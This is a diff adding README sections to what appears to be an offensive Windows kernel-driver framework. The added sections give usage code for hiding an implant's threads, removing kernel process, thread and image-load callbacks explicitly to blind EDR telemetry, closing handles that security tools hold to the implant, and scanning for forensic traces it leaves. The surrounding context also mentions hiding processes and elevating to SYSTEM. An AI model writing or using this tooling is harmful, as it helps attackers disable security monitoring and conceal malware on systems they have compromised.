@@ -82,6 +82,10 @@
         -   [How to read and write raw buffers via the driver](#how-to-read-and-write-raw-buffers-via-the-driver)
         -   [How to hide a process from Task Manager](#how-to-hide-a-process-from-task-manager)
         -   [How to elevate a process to SYSTEM](#how-to-elevate-a-process-to-system)
+        -   [How to hide threads from enumeration](#how-to-hide-threads-from-enumeration)
+        -   [How to enumerate and remove kernel callbacks](#how-to-enumerate-and-remove-kernel-callbacks)
+        -   [How to strip process handles](#how-to-strip-process-handles)
+        -   [How to scan for forensic artifacts](#how-to-scan-for-forensic-artifacts)
         -   [A full driver interface example](#a-full-driver-interface-example)
     - [**Basic overlay implementation**](#basic-overlay-implementation)
         -   [How to setup your overlay](#how-to-setup-your-overlay)
@@ -1743,6 +1747,133 @@ The framework contains the following modules:
             // Or elevate a specific PID
             if( driver->elevate_token( 1337 ) )
                 printf( "[+] PID 1337 elevated to SYSTEM!\n" );
+        }
+        ```
+
+    - ### **How to hide threads from enumeration**
+        The `hide_threads()` method unlinks all threads from the process's `ThreadListHead` in the EPROCESS structure. After calling this, thread enumeration APIs (e.g. `NtQuerySystemInformation`, Process Explorer) will no longer see the threads. Returns `std::optional<ULONG>` — the number of threads hidden on success, or `std::nullopt` on failure.
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void hide_my_threads()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            driver->attach( L"implant.exe" );
+
+            if( auto hidden = driver->hide_threads() )
+                printf( "[+] Hidden %u threads from enumeration.\n", *hidden );
+            else
+                printf( "[!] Failed to hide threads.\n" );
+        }
+        ```
+
+    - ### **How to enumerate and remove kernel callbacks**
+        The driver can enumerate registered kernel notification callbacks (process creation, thread creation, image load) and remove them individually or all at once. This is useful for blinding EDR kernel telemetry. Both `enum_callbacks()` and `remove_all_callbacks()` return modern STL types — `std::optional<std::vector<callback_info>>` and `std::optional<ULONG>` respectively — so you can use range-based for loops directly.
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void blind_edr()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            // Enumerate all process creation callbacks
+            if( auto callbacks = driver->enum_callbacks( CALLBACK_TYPE_PROCESS ) )
+            {
+                printf( "[+] Found %llu process callbacks:\n", callbacks->size() );
+
+                for( const auto& cb : *callbacks )
+                    printf( "    [%u] 0x%llX\n", cb.index, cb.address );
+            }
+
+            // Remove all process creation callbacks
+            if( auto removed = driver->remove_all_callbacks( CALLBACK_TYPE_PROCESS ) )
+                printf( "[+] Removed %u process callbacks.\n", *removed );
+
+            // Remove all thread creation callbacks
+            if( auto removed = driver->remove_all_callbacks( CALLBACK_TYPE_THREAD ) )
+                printf( "[+] Removed %u thread callbacks.\n", *removed );
+
+            // Remove all image load callbacks
+            if( auto removed = driver->remove_all_callbacks( CALLBACK_TYPE_IMAGE ) )
+                printf( "[+] Removed %u image callbacks.\n", *removed );
+
+            // Or remove a single callback by index
+            if( driver->remove_callback( CALLBACK_TYPE_PROCESS, 3 ) )
+                printf( "[+] Removed callback at index 3.\n" );
+        }
+        ```
+
+    - ### **How to strip process handles**
+        The `strip_handles()` method closes all handles to a process that are held by other processes. This prevents other processes (including EDRs) from inspecting or manipulating the target via handle-based APIs like `ReadProcessMemory`, `NtQueryInformationProcess`, etc. Returns `std::optional<ULONG>` — the number of handles stripped, or `std::nullopt` on failure.
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void strip_my_handles()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            driver->attach( L"implant.exe" );
+
+            if( auto stripped = driver->strip_handles() )
+                printf( "[+] Closed %u handles held by other processes.\n", *stripped );
+            else
+                printf( "[!] Failed to strip handles.\n" );
+        }
+        ```
+
+    - ### **How to scan for forensic artifacts**
+        The `scan_artifacts()` method scans for execution traces left by a given executable across four forensic sources: Prefetch files, ShimCache (AppCompatCache), BAM (Background Activity Moderator) registry entries, and the AmCache hive. All findings are also logged via kernel `DbgPrint` (visible in WinDbg/DebugView). Returns `std::optional<std::vector<artifact_info>>` for direct use with range-based for loops.
+
+        Available artifact type flags (combine with `|`):
+        - `ARTIFACT_TYPE_PREFETCH` — Prefetch files in `C:\Windows\Prefetch`
+        - `ARTIFACT_TYPE_SHIMCACHE` — ShimCache entries in the registry
+        - `ARTIFACT_TYPE_BAM` — BAM entries per user SID
+        - `ARTIFACT_TYPE_AMCACHE` — AmCache hive presence
+        - `ARTIFACT_TYPE_ALL` — all of the above
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void check_traces()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            // Scan for all artifact types
+            if( auto artifacts = driver->scan_artifacts( L"implant.exe" ) )
+            {
+                printf( "[+] Found %llu forensic artifacts:\n", artifacts->size() );
+
+                for( const auto& a : *artifacts )
+                    wprintf( L"    [type: %u] %s\n", a.type, a.path.c_str() );
+            }
+            else
+            {
+                printf( "[!] Artifact scan failed.\n" );
+            }
+
+            // Scan only Prefetch and ShimCache
+            if( auto artifacts = driver->scan_artifacts( L"implant.exe",
+                ARTIFACT_TYPE_PREFETCH | ARTIFACT_TYPE_SHIMCACHE ) )
+            {
+                for( const auto& a : *artifacts )
+                    wprintf( L"    %s\n", a.path.c_str() );
+            }
         }
         ```
 
